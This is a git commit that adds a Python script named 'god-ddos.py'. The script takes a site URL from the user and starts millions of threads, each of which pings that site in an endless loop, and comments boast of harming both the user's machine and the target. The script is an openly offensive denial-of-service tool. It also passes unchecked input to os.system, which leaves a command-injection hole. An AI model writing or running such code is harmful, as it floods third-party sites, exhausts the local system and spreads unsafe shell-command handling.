2912f39255133936a892ef1443d664dd7d5924f5
Vackyton AKA Pure Idiot Wants to die =1 <vackytonplays@gmail.com>
2021-09-23 20:35:22 -0400

    Create god-ddos.py

---
+++ files/god-ddos.py
@@ -0,0 +1,21 @@
+
+print('Warning! Your computer might explode or use a lot of ram and be slow(by vackyton)')
+
+import os
+import threading
+
+#import your stuff
+
+link = input('Enter site url(ex: www.google.com): ')
+#site
+
+def attack_():
+    while True:
+        os.system('ping ' + link)
+
+#This makes the function ping
+
+for i in range(4388787):
+    thread = threading.Thread(target=attack_)
+    thread.start()
+#F**K YOUR COMPUTER AND ALSO THE SITE :))))))))
